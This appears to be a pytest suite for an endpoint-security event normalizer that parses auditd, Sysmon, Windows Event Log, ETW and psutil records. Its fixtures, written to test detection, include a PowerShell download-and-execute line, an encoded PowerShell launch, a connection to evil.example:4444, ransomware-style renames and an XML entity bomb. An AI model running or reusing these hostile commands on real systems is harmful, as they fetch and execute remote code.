# ruff: noqa: SIM105
from __future__ import annotations

import json
import random
import string

import pytest

from centralium.agent.interfaces import Normalizer
from centralium.agent.models import EventType
from centralium.agent.normalization import EventNormalizer, detect_format
from centralium.agent.normalization.auditd import parse_record, parse_saddr
from centralium.agent.normalization.common import (
    canon_ip,
    canon_path,
    canon_port,
    canon_sha256,
    parse_ts,
    safe_meta,
)

N = EventNormalizer(host_id="h1")
SERIAL = 456


def hexs(s: str) -> str:
    return s.encode().hex().upper()


def audit(serial: int, ts: str, rtype: str, body: str) -> str:
    return f"type={rtype} msg=audit({ts}:{serial}): {body}"


def sysc(
    num: int, extra: str = "", serial: int = SERIAL, comm: str = "curl", exe: str = "/usr/bin/curl", **kw: str
) -> str:
    return audit(
        serial,
        "1700000000.123",
        "SYSCALL",
        f"arch=c000003e syscall={num} success=yes exit=0 {extra} items=1 ppid=1000 pid=1001 auid=1000 uid=0 "
        f'gid=0 euid=0 tty=pts0 ses=3 comm="{comm}" exe="{exe}" key="k"',
    )


def sockaddr_hex(ip: str, port: int) -> str:
    return (
        (b"\x02\x00" + port.to_bytes(2, "big") + bytes(int(x) for x in ip.split(".")) + b"\x00" * 8)
        .hex()
        .upper()
    )


# --------------------------------------------------------------------------- protocol / helpers
def test_implements_normalizer_protocol():
    assert isinstance(N, Normalizer)


def test_common_helpers():
    assert canon_path("/a/b/../c//d") == "/a/c/d"
    assert canon_path("a\x00b") is None
    assert canon_path('"C:\\Windows\\System32\\cmd.exe"') == "C:\\Windows\\System32\\cmd.exe"
    assert canon_ip("::ffff:10.0.0.1") == "10.0.0.1"
    assert canon_ip("999.1.1.1") is None
    assert canon_port("70000") is None and canon_port("443") == 443 and canon_port("x") is None
    assert canon_sha256("MD5=aa,SHA256=" + "AB" * 32) == "ab" * 32
    assert canon_sha256("zz") is None
    assert parse_ts("2024-01-02 03:04:05.123").year == 2024
    assert parse_ts("2024-01-02T03:04:05.1234567Z").tzinfo is not None
    assert parse_ts(1700000000000).year == 2023
    assert parse_ts("garbage") is None
    assert len(safe_meta({"a": "x" * 5000})["a"]) == 2048


# --------------------------------------------------------------------------- auditd
def test_auditd_execve_with_hex_args():
    lines = [
        sysc(59),
        audit(
            SERIAL,
            "1700000000.123",
            "EXECVE",
            f'argc=4 a0="curl" a1="-o" a2={hexs("/tmp/my file")} a3="http://x.test/p"',
        ),
        audit(SERIAL, "1700000000.123", "CWD", 'cwd="/home/u"'),
    ]
    ev = N.normalize({"format": "auditd", "lines": lines})
    assert ev.event_type == EventType.PROCESS_START
    assert ev.command_line == "curl -o /tmp/my file http://x.test/p"
    assert (ev.pid, ev.ppid, ev.process_name, ev.executable_path) == (1001, 1000, "curl", "/usr/bin/curl")
    assert ev.user == "root" and ev.source == "auditd" and ev.host_id == "h1"
    assert ev.raw_metadata["audit_serial"] == SERIAL


def test_auditd_connect_sockaddr():
    lines = [
        sysc(42),
        audit(SERIAL, "1700000000.123", "SOCKADDR", f"saddr={sockaddr_hex('93.184.216.34', 443)}"),
    ]
    ev = N.normalize({"lines": lines})
    assert ev.event_type == EventType.NETWORK_CONNECT
    assert (ev.destination_ip, ev.destination_port) == ("93.184.216.34", 443)
    assert parse_saddr("0100" + b"/run/x\x00".hex()) == {"family": "unix", "path": "/run/x"}


def test_auditd_unix_socket_connect_is_not_network_event():
    lines = [sysc(42), audit(SERIAL, "1.0", "SOCKADDR", "saddr=01002F72756E2F7800")]
    assert N.normalize_many({"lines": lines}) == []
    with pytest.raises(ValueError):
        N.normalize({"lines": lines})


def test_auditd_rename_unlink_open():
    ren = [
        sysc(82),
        audit(SERIAL, "1.0", "CWD", 'cwd="/home/u"'),
        audit(SERIAL, "1.0", "PATH", 'item=0 name="/home/u/a.docx" nametype=DELETE'),
        audit(SERIAL, "1.0", "PATH", 'item=1 name="a.docx.locked" nametype=CREATE'),
    ]
    ev = N.normalize({"lines": ren})
    assert ev.event_type == EventType.FILE_RENAME
    assert ev.file_path == "/home/u/a.docx.locked"
    assert ev.raw_metadata["old_path"] == "/home/u/a.docx"

    unl = [sysc(87), audit(SERIAL, "1.0", "PATH", 'item=0 name="/tmp/x" nametype=DELETE')]
    assert N.normalize({"lines": unl}).event_type == EventType.FILE_DELETE

    # openat: a2 = flags (O_WRONLY|O_CREAT|O_TRUNC = 0x241), PATH nametype=CREATE
    opn = [
        sysc(257, "a0=ffffff9c a1=0 a2=241"),
        audit(SERIAL, "1.0", "PATH", 'item=1 name="/tmp/new" nametype=CREATE'),
    ]
    ev = N.normalize({"lines": opn})
    assert ev.event_type == EventType.FILE_CREATE and ev.file_path == "/tmp/new"
    # read-only open is ignored
    ro = [
        sysc(257, "a0=ffffff9c a1=0 a2=0"),
        audit(SERIAL, "1.0", "PATH", 'item=0 name="/etc/hosts" nametype=NORMAL'),
    ]
    assert N.normalize_many({"lines": ro}) == []


def test_auditd_misc_syscalls_and_auth():
    assert N.normalize({"lines": [sysc(105, "a0=0")]}).event_type == EventType.PRIVILEGE_CHANGE
    assert N.normalize({"lines": [sysc(101, "a0=10 a1=77")]}).event_type == EventType.PROCESS_INJECT
    assert N.normalize({"lines": [sysc(313)]}).event_type == EventType.MODULE_LOAD
    login = audit(
        9,
        "1700000000.1",
        "USER_LOGIN",
        'pid=5 uid=0 auid=1000 ses=1 acct="bob" exe="/usr/sbin/sshd" addr=203.0.113.7 res=failed',
    )
    ev = N.normalize({"line": login})
    assert ev.event_type == EventType.AUTH and ev.user == "bob" and ev.destination_ip == "203.0.113.7"
    assert ev.raw_metadata["result"] == "failed"


def test_auditd_malformed_inputs_never_crash():
    for bad in (
        {"lines": []},
        {"lines": ["garbage"]},
        {"lines": [123]},
        {"lines": ["type=SYSCALL msg=audit(x:y): a=b"]},
        {"lines": ['type=EXECVE msg=audit(1.0:1): argc=999999999 a0="x"']},
        {"format": "auditd"},
    ):
        try:
            N.normalize(bad)
        except ValueError:
            pass
    assert parse_record("not a record") is None


# --------------------------------------------------------------------------- Sysmon
def sysmon_xml(eid: int, **data: str) -> str:
    items = "".join(f"<Data Name='{k}'>{v}</Data>" for k, v in data.items())
    return (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
        "<Provider Name='Microsoft-Windows-Sysmon' Guid='{x}'/>"
        f"<EventID>{eid}</EventID><TimeCreated SystemTime='2024-03-05T10:20:30.1234567Z'/>"
        "<EventRecordID>77</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel>"
        "<Computer>WS01</Computer></System>"
        f"<EventData>{items}</EventData></Event>"
    )


def test_sysmon_process_create_xml():
    sha = "AB" * 32
    xml = sysmon_xml(
        1,
        Image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        ProcessId="4242",
        CommandLine="powershell -enc AAAA",
        ParentProcessId="100",
        ParentImage="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
        User="CORP\\alice",
        Hashes=f"MD5={'1' * 32},SHA256={sha}",
        IntegrityLevel="High",
    )
    ev = N.normalize({"xml": xml})
    assert ev.event_type == EventType.PROCESS_START and ev.source == "sysmon"
    assert ev.pid == 4242 and ev.ppid == 100 and ev.parent_process == "WINWORD.EXE"
    assert ev.process_name == "powershell.exe" and ev.hash_sha256 == sha.lower()
    assert ev.host_id == "WS01" and ev.user == "CORP\\alice"
    assert ev.timestamp.year == 2024 and ev.raw_metadata["integrity_level"] == "High"


def test_sysmon_network_dns_file_registry_inject_wmi():
    n = N.normalize(
        {
            "xml": sysmon_xml(
                3,
                Image="C:\\a.exe",
                ProcessId="9",
                DestinationIp="198.51.100.9",
                DestinationPort="4444",
                Protocol="tcp",
                DestinationHostname="evil.example.",
            )
        }
    )
    assert (n.event_type, n.destination_ip, n.destination_port, n.domain) == (
        EventType.NETWORK_CONNECT,
        "198.51.100.9",
        4444,
        "evil.example",
    )
    d = N.normalize(
        {
            "xml": sysmon_xml(
                22, Image="C:\\a.exe", ProcessId="9", QueryName="Abc.Example.COM", QueryResults="1.2.3.4"
            )
        }
    )
    assert d.event_type == EventType.DNS_QUERY and d.domain == "abc.example.com"
    f = N.normalize(
        {"xml": sysmon_xml(11, Image="C:\\a.exe", ProcessId="9", TargetFilename="C:\\Users\\a\\x.exe")}
    )
    assert f.event_type == EventType.FILE_CREATE and f.file_path == "C:\\Users\\a\\x.exe"
    r = N.normalize(
        {
            "xml": sysmon_xml(
                13,
                EventType="SetValue",
                Image="C:\\a.exe",
                ProcessId="9",
                TargetObject="HKU\\S\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x",
                Details="C:\\x.exe",
            )
        }
    )
    assert r.event_type == EventType.REGISTRY_MODIFY and r.raw_metadata["registry_value"] == "C:\\x.exe"
    i = N.normalize(
        {
            "xml": sysmon_xml(
                8, SourceImage="C:\\a.exe", SourceProcessId="9", TargetImage="C:\\b.exe", TargetProcessId="10"
            )
        }
    )
    assert i.event_type == EventType.PROCESS_INJECT and i.raw_metadata["target_pid"] == "10"
    w = N.normalize(
        {
            "xml": sysmon_xml(
                20, Operation="Created", Name="evil", Type="Command Line", Destination="powershell -enc AAA"
            )
        }
    )
    assert w.event_type == EventType.PERSISTENCE and w.raw_metadata["persistence_kind"] == "wmi"
    assert (
        N.normalize({"xml": sysmon_xml(5, Image="C:\\a.exe", ProcessId="9")}).event_type
        == EventType.PROCESS_EXIT
    )
    assert N.normalize({"xml": sysmon_xml(255)}).event_type == EventType.OTHER


def test_sysmon_json_shapes():
    j = {
        "Event": {
            "System": {
                "EventID": 1,
                "Provider": {"Name": "Microsoft-Windows-Sysmon"},
                "TimeCreated": {"SystemTime": "2024-01-01T00:00:00Z"},
            },
            "EventData": {"Image": "C:\\x\\cmd.exe", "ProcessId": "5", "CommandLine": "cmd /c whoami"},
        }
    }
    ev = N.normalize(j)
    assert ev.event_type == EventType.PROCESS_START and ev.command_line == "cmd /c whoami"
    ev2 = N.normalize({"format": "sysmon", "json": json.dumps(j)})
    assert ev2.pid == 5


def test_xml_hardening():
    bomb = '<!DOCTYPE x [<!ENTITY a "aaaa">]><Event><System><EventID>1</EventID></System></Event>'
    with pytest.raises(ValueError):
        N.normalize({"xml": bomb})
    with pytest.raises(ValueError):
        N.normalize({"xml": "<Event><oops"})
    with pytest.raises(ValueError):
        N.normalize({"xml": "<Event>" + "a" * 2_000_000 + "</Event>"})


# --------------------------------------------------------------------------- Event Log
def evlog(eid: int, channel: str = "Security", **data: str) -> dict:
    return {
        "Event": {
            "System": {
                "EventID": eid,
                "Channel": channel,
                "Computer": "WS02",
                "Provider": {"Name": "Microsoft-Windows-Security-Auditing"},
                "TimeCreated": {"SystemTime": "2024-05-05T05:05:05Z"},
            },
            "EventData": data,
        }
    }


def test_eventlog_4688_and_friends():
    ev = N.normalize(
        evlog(
            4688,
            NewProcessId="0x1a4",
            NewProcessName="C:\\Windows\\System32\\cmd.exe",
            CommandLine="cmd /c dir",
            ParentProcessName="C:\\Windows\\explorer.exe",
            ProcessId="0x10",
            SubjectUserName="bob",
            SubjectDomainName="CORP",
        )
    )
    assert ev.event_type == EventType.PROCESS_START and ev.pid == 0x1A4 and ev.ppid == 0x10
    assert ev.parent_process == "explorer.exe" and ev.user == "CORP\\bob" and ev.source == "eventlog"

    svc = N.normalize(
        evlog(
            7045,
            "System",
            ServiceName="evilsvc",
            ImagePathName="C:\\Temp\\e.exe -k x",
            AccountName="LocalSystem",
        )
    )
    assert svc.event_type == EventType.SERVICE_CHANGE and svc.command_line.startswith("C:\\Temp\\e.exe")

    task = N.normalize(
        evlog(
            4698,
            TaskName="\\Updater",
            TaskContent="<Task><Actions><Exec><Command>C:\\x.exe</Command><Arguments>-s</Arguments></Exec></Actions></Task>",
            SubjectUserName="bob",
        )
    )
    assert task.event_type == EventType.SCHEDULED_TASK and task.command_line == "C:\\x.exe -s"

    net = N.normalize(
        evlog(
            5156,
            Application="\\device\\harddiskvolume3\\x.exe",
            ProcessID="77",
            DestAddress="203.0.113.5",
            DestPort="8080",
            Protocol="6",
            Direction="%%14593",
        )
    )
    assert (
        net.event_type == EventType.NETWORK_CONNECT and net.protocol == "tcp" and net.destination_port == 8080
    )

    assert (
        N.normalize(evlog(4624, TargetUserName="alice", IpAddress="10.1.1.1", LogonType="10")).event_type
        == EventType.AUTH
    )
    assert N.normalize(evlog(1102)).event_type == EventType.TAMPER
    ps = N.normalize(
        evlog(
            4104,
            "Microsoft-Windows-PowerShell/Operational",
            ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x')",
        )
    )
    assert ps.command_line.startswith("IEX")
    reg = N.normalize(
        evlog(
            4657,
            ObjectName="\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            ProcessName="C:\\a.exe",
            NewValue="x",
        )
    )
    assert reg.event_type == EventType.REGISTRY_MODIFY
    with pytest.raises(ValueError):
        N.normalize(evlog(4663, ObjectName="C:\\x", AccessMask="0x1", ProcessName="C:\\a.exe"))  # read-only
    assert (
        N.normalize(evlog(4663, ObjectName="C:\\x", AccessMask="0x2", ProcessName="C:\\a.exe")).event_type
        == EventType.FILE_MODIFY
    )


# --------------------------------------------------------------------------- ETW / generic / psutil
def test_etw_shapes():
    p = N.normalize(
        {
            "provider": "Microsoft-Windows-Kernel-Process",
            "event_id": 1,
            "ProcessID": 55,
            "ParentProcessID": 4,
            "ImageName": "C:\\Windows\\notepad.exe",
            "CommandLine": "notepad x.txt",
            "timestamp": 1700000000,
        }
    )
    assert p.event_type == EventType.PROCESS_START and p.source == "etw" and p.pid == 55 and p.ppid == 4
    f = N.normalize(
        {
            "format": "etw",
            "provider": "Microsoft-Windows-Kernel-File",
            "event_name": "Rename",
            "pid": 5,
            "FileName": "C:\\a.txt",
            "NewFileName": "C:\\a.txt.locked",
        }
    )
    assert (
        f.event_type == EventType.FILE_RENAME
        and f.file_path == "C:\\a.txt.locked"
        and f.raw_metadata["old_path"] == "C:\\a.txt"
    )
    n = N.normalize(
        {
            "provider": "Microsoft-Windows-Kernel-Network",
            "event_name": "TcpIpConnect",
            "pid": 5,
            "daddr": "198.51.100.1",
            "dport": 443,
        }
    )
    assert n.event_type == EventType.NETWORK_CONNECT
    d = N.normalize(
        {
            "provider": "Microsoft-Windows-DNS-Client",
            "event_id": 3008,
            "fields": {"QueryName": "x.example.org"},
            "pid": 3,
        }
    )
    assert d.event_type == EventType.DNS_QUERY and d.domain == "x.example.org"


def test_generic_and_replay_formats():
    ev = N.normalize(
        {
            "event_type": "process_start",
            "pid": "12",
            "cmdline": "ls -l",
            "exe": "/bin/ls",
            "extra_field": 1,
            "sha256": "a" * 64,
            "ts": "2024-01-01T00:00:00Z",
        }
    )
    assert (
        ev.pid == 12
        and ev.process_name == "ls"
        and ev.hash_sha256 == "a" * 64
        and ev.raw_metadata["extra_field"] == 1
    )
    assert ev.source == "replay"
    assert (
        N.normalize(
            {
                "format": "replay",
                "delay": 0.1,
                "event": {"type": "connect", "dest_ip": "1.2.3.4", "dest_port": 80},
            }
        ).destination_port
        == 80
    )
    assert detect_format({"event_type": "x"}) == "generic"
    # invalid ip/port are dropped (None), not crashed on
    ev = N.normalize({"event_type": "network_connect", "dest_ip": "not-an-ip", "dest_port": 99999})
    assert ev.destination_ip is None and ev.destination_port is None
    with pytest.raises(ValueError):
        N.normalize({"event_type": "bogus"})
    with pytest.raises(ValueError):
        N.normalize({})


def test_psutil_snapshots():
    p = N.normalize(
        {
            "format": "psutil",
            "kind": "process",
            "pid": 5,
            "ppid": 1,
            "name": "sleep",
            "exe": "/usr/bin/sleep",
            "cmdline": ["sleep", "5"],
            "username": "u",
            "parent_name": "bash",
            "sha256": "b" * 64,
        }
    )
    assert (
        p.event_type == EventType.PROCESS_START and p.command_line == "sleep 5" and p.parent_process == "bash"
    )
    c = N.normalize(
        {
            "format": "psutil",
            "kind": "connection",
            "pid": 5,
            "name": "curl",
            "laddr": ["10.0.0.2", 5555],
            "raddr": ["93.184.216.34", 443],
            "status": "ESTABLISHED",
            "type": "tcp",
        }
    )
    assert (
        c.event_type == EventType.NETWORK_CONNECT
        and c.destination_ip == "93.184.216.34"
        and c.protocol == "tcp"
    )
    li = N.normalize(
        {
            "format": "psutil",
            "kind": "listen",
            "pid": 5,
            "laddr": ["0.0.0.0", 8080],
            "raddr": [],
            "status": "LISTEN",
        }
    )
    assert li.event_type == EventType.NETWORK_LISTEN and li.destination_port == 8080
    assert (
        N.normalize({"format": "psutil", "kind": "process_exit", "pid": 5}).event_type
        == EventType.PROCESS_EXIT
    )
    with pytest.raises(ValueError):
        N.normalize({"format": "psutil", "kind": "weird"})


def test_fuzz_only_valueerror():
    rng = random.Random(1337)
    keys = [
        "format",
        "kind",
        "event_type",
        "xml",
        "json",
        "lines",
        "line",
        "provider",
        "pid",
        "ppid",
        "dest_ip",
        "dest_port",
        "timestamp",
        "Event",
        "EventData",
        "raw_metadata",
        "cmdline",
        "laddr",
        "raddr",
        "event_id",
        "fields",
        "event",
    ]
    junk = [
        None,
        0,
        -1,
        2**70,
        1.5,
        "",
        "x" * 50,
        "\x00",
        [],
        [1, "a", None],
        {},
        {"a": {"b": [1]}},
        True,
        b"bytes",
        "<Event/>",
        "type=SYSCALL",
    ]
    for _ in range(3000):
        raw = {rng.choice(keys): rng.choice(junk) for _ in range(rng.randint(0, 5))}
        if rng.random() < 0.3:
            raw["format"] = rng.choice(["auditd", "psutil", "sysmon", "eventlog", "etw", "generic", "replay"])
        try:
            N.normalize_many(raw)
        except ValueError:
            pass
    for _ in range(300):
        s = "".join(rng.choice(string.printable) for _ in range(rng.randint(0, 200)))
        try:
            N.normalize_many({"lines": [s]})
        except ValueError:
            pass
    with pytest.raises(ValueError):
        N.normalize("not a dict")  # type: ignore[arg-type]
    assert N.try_normalize(None) is None
